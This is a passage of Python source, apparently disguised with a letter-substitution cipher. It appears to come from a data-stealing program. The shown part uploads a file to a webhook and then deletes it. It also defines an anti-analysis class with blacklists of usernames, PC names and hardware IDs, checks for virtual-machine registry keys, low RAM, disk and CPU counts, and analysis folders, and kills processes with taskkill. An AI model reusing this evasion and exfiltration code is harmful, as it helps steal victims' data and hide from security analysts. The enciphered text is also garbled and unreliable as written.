        ygv.uxx_zcyfx(hugy = 'Vumcw Chzi', pufoy = VCHZI, chfchy = Zufmy)
        ygv.uxx_zcyfx(hugy = '\hMsmnyg Chzi', pufoy = MSMCHZI, chfchy = Zufmy)
        ygv.uxx_zcyfx(hugy = 'Nieyh(m)', pufoy = NIECHZI, chfchy = Zufmy)
        ygv.uxx_zcyfx(hugy = 'Zcfym Ziohx', pufoy = ZZIOHX, chfchy = Zufmy)

        ygv.myn_nbogvhucf(cguay1)
        biies.myhx(ygvyx = ygv)

        qcnb ijyh(_tcjzcfy, 'lv') um z:
            bnnjr.jimn(myfz.qyvbiie, zcfym={'ojfiux_zcfy': z})
        im.lygipy(_tcjzcfy)

wfumm UhncXyvoa(zohwncihm):
    chPG = Zufmy

    xyz __chcn__(myfz):
        myfz.jliwymmym = fcmn()

        myfz.vfuweFcmnyxOmylm = ["QXUAOncfcnsUwwiohn", "Uvvs", "Jynyl Qcfmih", "bgulw", "junyr", "DIBH-JW", "LXbD0WHZyptR", "eYywzGqad", "Zluhe",
                                 "8Hf0WifHK5vk", "Fcmu", "Dibh", "ayilay", "JrgxOIjPsr", "8PctMG", "q0zdoIPgWwJ5U", "fgPqdd9v", "JkIHdBPqyrmM", "3o2p9g8", "Dofcu", "BYOyLtf", ]
        myfz.vfuweFcmnyxJWHugym = ["VYY7370W-8W0W-4", "XYMENIJ-HUEZZGN", "QCH-5Y07WIM9UFL", "V30Z0242-1W6U-4", "XYMENIJ-PLMKFUA", "K9CUNLEJLB", "RW64TV", "XYMENIJ-X019AXG", "XYMENIJ-QC8WFYN", "MYLPYL1", "FCMU-JW", "DIBH-JW",
                                   "XYMENIJ-V0N93X6", "XYMENIJ-1JSEJ29", "XYMENIJ-1S2433L", "QCFYSJW", "QILE", "asunn", "6W4Y733Z-W2X9-4", "LUFJBM-JW", "XYMENIJ-QA3GSDM", "XYMENIJ-7RW6AYT", "XYMENIJ-5IP9M0I", "KulTblxVjd", "ILYFYYJW", "ULWBCVUFXJW", "DOFCU-JW", "x1vhDezPfB", ]
        myfz.vfuweFcmnyxBQCXM = ["7UV5W494-39Z5-4941-9163-47Z54X6X5016", "032Y02V4-0499-05W3-0806-3W0700080009", "03XY0294-0480-05XY-1U06-350700080009", "11111111-2222-3333-4444-555555555555", "6Z3WU5YW-VYW9-4U4X-8274-11168Z640058", "UXYYYY9Y-YZ0U-6V84-V14V-V83U54UZW548", "4W4W4544-0050-3710-8058-WUW04Z59344U", "00000000-0000-0000-0000-UW1Z6VX04972", "00000000-0000-0000-0000-000000000000", "5VX24X56-789Z-8468-7WXW-WUU7222WW121", "49434X53-0200-9065-2500-65902500Y439", "49434X53-0200-9036-2500-36902500Z022", "777X84V3-88X1-451W-93Y4-X235177420U7", "49434X53-0200-9036-2500-369025000W65",
                                 "V1112042-52Y8-Y25V-3655-6U4Z54155XVZ", "00000000-0000-0000-0000-UW1Z6VX048ZY", "YV16924V-ZV6X-4ZU1-8666-17V91Z62ZV37", "U15U930W-8251-9645-UZ63-Y45UX728W20W", "67Y595YV-54UW-4ZZ0-V5Y3-3XU7W7V547Y3", "W7X23342-U5X4-68U1-59UW-WZ40Z735V363", "63203342-0YV0-UU1U-4XZ5-3ZV37XVV0670", "44V94X56-65UV-XW02-86U0-98143U7423VZ", "6608003Z-YWY4-494Y-V07Y-1W4615X1X93W", "X9142042-8Z51-5YZZ-X5Z8-YY9UY3X1602U", "49434X53-0200-9036-2500-369025003UZ0", "8V4Y8278-525W-7343-V825-280UYVWX3VWV", "4X4XXW94-Y06W-44Z4-95ZY-33U1UXU5UW27", "79UZ5279-16WZ-4094-9758-Z88U616X81V4", ]

        zil zohw ch [myfz.fcmnWbywe, myfz.lyacmnlsWbywe, myfz.mjywmWbywe]:
            jliwymm = nblyuxcha.Nblyux(nulayn=zohw, xuygih=Nloy)
            myfz.jliwymmym.ujjyhx(jliwymm)
            jliwymm.mnuln()
        zil n ch myfz.jliwymmym:
            nls:
                n.dich()
            yrwyjn LohncgyYllil:
                wihnchoy

    xyz jlialugYrcn(myfz):
        myfz.__wfumm__.chPG = Nloy

    xyz jlialugEcff(myfz, jliw):
        nls:
            im.msmnyg(z"numeecff /Z /N /CG {jliw}")
        yrwyjn (JylgcmmcihYllil, ChnyllojnyxYllil, WbcfxJliwymmYllil, JliwymmFiieojYllil):
            jumm

    xyz fcmnWbywe(myfz):
        zil junb ch [l'X:\Niifm', l'X:\IM2', l'X:\HN3R']:
            cz im.junb.yrcmnm(junb):
                myfz.jlialugYrcn()

        zil omyl ch myfz.vfuweFcmnyxOmylm:
            cz Pcwncg == omyl:
                myfz.jlialugYrcn()

        zil jwHugy ch myfz.vfuweFcmnyxJWHugym:
            cz Pcwncg_jw == jwHugy:
                myfz.jlialugYrcn()

        nls:
            gsBQCX = movjliwymm.wbywe_ionjon(
                l"qgcw wmjlixown ayn oocx", wlyuncihzfuam=0r08000000).xywixy().mjfcn('\h')[1].mnlcj()
        yrwyjn Yrwyjncih:
            gsBQCX = ""
        zil bqcx ch myfz.vfuweFcmnyxBQCXM:
            cz gsBQCX == bqcx:
                myfz.jlialugYrcn()

    xyz mjywmWbywe(myfz):
        lug = mnl(jmoncf.pclnouf_gygils()[0]/1024 ** 3).mjfcn(".")[0]
        cz chn(lug) <= 3: 
            myfz.jlialugYrcn()
        xcme = mnl(jmoncf.xcme_omuay('/')[0]/1024 ** 3).mjfcn(".")[0]
        cz chn(xcme) <= 50:  
            myfz.jlialugYrcn()
        cz chn(jmoncf.wjo_wiohn()) <= 1:  
            myfz.jlialugYrcn()

    xyz lyacmnlsWbywe(myfz):
        lya1 = im.msmnyg(
            "LYA KOYLS BEYS_FIWUF_GUWBCHY\\MSMNYG\\WihnlifMyn001\\Wihnlif\\Wfumm\\{4X36Y968-Y325-11WY-VZW1-08002VY10318}\\0000\\XlcpylXymw 2> hof")
        lya2 = im.msmnyg(
            "LYA KOYLS BEYS_FIWUF_GUWBCHY\\MSMNYG\\WihnlifMyn001\\Wihnlif\\Wfumm\\{4X36Y968-Y325-11WY-VZW1-08002VY10318}\\0000\\JlipcxylHugy 2> hof")
        cz (lya1 uhx lya2) != 1:
            myfz.jlialugYrcn()

        buhxfy = qchlya.IjyhEys(qchlya.BEYS_FIWUF_GUWBCHY,
                                'MSMNYG\\WollyhnWihnlifMyn\\Mylpcwym\\Xcme\\Yhog')
        nls:
            lya_puf = qchlya.KoylsPufoyYr(buhxfy, '0')[0]

            cz ("PGquly" il "PVIR") ch lya_puf:
                myfz.jlialugYrcn()
        zchuffs:
            qchlya.WfimyEys(buhxfy)
            

cz __hugy__ == "__guch__" uhx im.hugy == "hn":
    umshwci.loh(Eipyhuhn().chcn())